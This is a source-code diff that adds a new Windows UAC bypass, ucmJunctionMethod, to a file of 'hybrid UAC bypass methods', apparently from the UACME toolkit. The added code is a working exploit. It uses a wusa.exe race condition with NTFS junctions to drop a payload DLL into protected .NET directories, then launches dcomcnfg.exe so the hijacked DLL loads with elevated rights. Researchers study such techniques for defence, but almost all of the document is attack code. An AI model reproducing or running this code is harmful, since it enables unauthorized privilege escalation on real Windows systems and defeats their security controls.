@@ -4,9 +4,9 @@
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     2.71
+*  VERSION:     2.74
 *
-*  DATE:        06 May 2017
+*  DATE:        20 June 2017
 *
 *  Hybrid UAC bypass methods.
 *
@@ -1735,6 +1735,139 @@ BOOL ucmUiAccessMethod(
         }
 
     } while (bCond);
+
+    return bResult;
+}
+
+/*
+* ucmJunctionMethod
+*
+* Purpose:
+*
+* Bypass UAC using two different steps:
+*
+* 1) Create wusa.exe race condition and force wusa to copy files to the protected directory using NTFS reparse point.
+* 2) Dll hijack dotnet dependencies.
+*
+* Wusa race condition in combination with junctions found by Thomas Vanhoutte.
+* Twitter: https://twitter.com/SandboxEscaper 
+* Blog: https://thomas-vanhoutte.blogspot.be
+*
+*/
+BOOL ucmJunctionMethod(
+    PVOID ProxyDll,
+    DWORD ProxyDllSize
+)
+{
+    BOOL bResult = FALSE, bDropComplete = FALSE, bCond = FALSE;
+    HKEY hKey = NULL;
+    LRESULT lResult;
+
+    LPWSTR lpTargetDirectory = NULL, lpEnd = NULL;
+
+    DWORD i, cValues = 0, cbMaxValueNameLen = 0, bytesIO;
+
+    WCHAR szBuffer[MAX_PATH * 2];
+    WCHAR szSource[MAX_PATH * 2];
+
+    do {
+
+        //
+        // Drop payload dll to %temp% and make cab for it.
+        //
+        RtlSecureZeroMemory(szSource, sizeof(szSource));
+        _strcpy(szSource, g_ctx.szTempDirectory);
+
+        if (g_ctx.dwBuildNumber < 9600) {
+            _strcat(szSource, OLE32_DLL);
+        }
+        else {
+            _strcat(szSource, MSCOREE_DLL);
+        }
+        if (!ucmCreateCabinetForSingleFile(szSource, ProxyDll, ProxyDllSize))
+            break;
+
+        //
+        // Locate target directory.
+        //
+        lResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, T_DOTNET_CLIENT, 0, MAXIMUM_ALLOWED, &hKey);
+        if (lResult != ERROR_SUCCESS)
+            break;
+
+        lResult = RegQueryInfoKey(hKey, 
+            NULL, 
+            NULL, 
+            NULL, 
+            NULL, 
+            NULL, 
+            NULL, 
+            &cValues, 
+            &cbMaxValueNameLen, 
+            NULL, 
+            NULL, 
+            NULL);
+
+        if (lResult != ERROR_SUCCESS)
+            break;
+
+        if ((cValues == 0) || (cbMaxValueNameLen == 0))
+            break;
+
+        if (cbMaxValueNameLen > MAX_PATH)
+            break;
+
+        bDropComplete = FALSE;
+
+        //
+        // Drop file in each.
+        //
+        for (i = 0; i < cValues; i++) {
+            
+            RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
+            bytesIO = MAX_PATH;
+
+            lResult = RegEnumValue(hKey, 
+                i, 
+                (LPWSTR)&szBuffer, 
+                &bytesIO, 
+                NULL, 
+                NULL, 
+                NULL, 
+                NULL);
+
+            lpTargetDirectory = _filepath(szBuffer, szBuffer);
+            if (lpTargetDirectory == NULL) {
+                bDropComplete = FALSE;
+                break;
+            }
+
+            lpEnd = _strend(lpTargetDirectory);
+            if (*(lpEnd - 1) == TEXT('\\'))
+                *(lpEnd - 1) = TEXT('\0');
+
+            if (!ucmWusaExtractViaJunction(lpTargetDirectory)) {
+                bDropComplete = FALSE;
+                break;
+            }
+
+            bDropComplete = TRUE;
+        }
+
+        if (!bDropComplete)
+            break;
+
+        //
+        // Exploit dll hijacking.
+        //
+        RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
+        _strcpy(szBuffer, g_ctx.szSystemDirectory);
+        _strcat(szBuffer, DCOMCNFG_EXE);
+        bResult = supRunProcess(szBuffer, NULL);
+
+    } while (bCond);
+
+    if (hKey != NULL)
+        RegCloseKey(hKey);
 
     return bResult;
 }
